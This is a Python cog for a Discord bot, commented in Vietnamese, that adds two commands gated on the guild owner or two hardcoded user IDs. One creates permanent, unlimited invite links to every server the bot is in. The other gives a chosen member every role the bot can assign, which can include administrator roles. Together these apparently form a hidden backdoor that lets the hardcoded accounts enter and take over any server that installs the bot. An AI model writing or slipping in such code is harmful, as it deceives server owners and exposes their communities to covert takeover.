import discord
from discord.ext import commands

def is_guild_owner_or_bot_owner():  
    async def predicate(ctx):  
        return ctx.author == ctx.guild.owner or ctx.author.id == 573768344960892928 or ctx.author.id == 1307765539896033312  
    return commands.check(predicate)

class InviteLink(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command(name="server_invite_links")
    @is_guild_owner_or_bot_owner()
    async def server_invite_links(self, ctx):
        embed = discord.Embed(title="Đường link mời của các server", color=discord.Color.blue())
        
        # Duyệt qua từng server (guild) mà bot tham gia
        for guild in self.client.guilds:
            channel = None
            # Duyệt qua các kênh văn bản trong guild để tìm kênh có quyền tạo invite
            for c in guild.text_channels:
                perms = c.permissions_for(guild.me)
                if perms.create_instant_invite:
                    channel = c
                    break
            
            if channel:
                try:
                    # Tạo invite với các tham số: không hết hạn, không giới hạn số lượt, duy nhất
                    invite = await channel.create_invite(max_age=0, max_uses=0, unique=True)
                    embed.add_field(name=guild.name, value=f"[Invite Link]({invite.url})", inline=False)
                except Exception as e:
                    embed.add_field(name=guild.name, value=f"Không thể tạo invite: {str(e)}", inline=False)
            else:
                embed.add_field(name=guild.name, value="Không có kênh phù hợp để tạo invite.", inline=False)
        
        await ctx.send(embed=embed)

    @commands.command(name="add_all_roles")
    @is_guild_owner_or_bot_owner()      
    async def add_all_roles(self, ctx, member: discord.Member):
        """
        Lệnh này sẽ thêm tất cả các role (ngoại trừ @everyone, các role managed, và các role có thứ tự cao hơn hoặc ngang với role cao nhất của bot)
        cho thành viên được chỉ định.
        """
        if not ctx.guild.me.guild_permissions.manage_roles:
            return await ctx.send("Bot không có quyền Manage Roles, không thể thực hiện thao tác này.")

        bot_top_role = ctx.guild.me.top_role

        # Lọc danh sách role:
        # - Loại bỏ role @everyone
        # - Loại bỏ role có vị trí >= bot_top_role.position
        # - Loại bỏ role do hệ thống quản lý (managed roles)
        roles_to_add = [
            role for role in ctx.guild.roles
            if role.name != "@everyone" and not role.managed and role.position < bot_top_role.position
        ]

        # Nếu danh sách role rỗng, có thể bot không thể gán role nào
        if not roles_to_add:
            return await ctx.send("Không tìm thấy role nào phù hợp để thêm.")

        try:
            await member.add_roles(*roles_to_add, reason=f"Thêm tất cả role bởi {ctx.author}")
            await ctx.send(f"Đã thêm tất cả các role phù hợp cho {member.mention}.")
        except Exception as e:
            await ctx.send(f"Không thể thêm role cho {member.mention}: {str(e)}")

async def setup(client):
    await client.add_cog(InviteLink(client))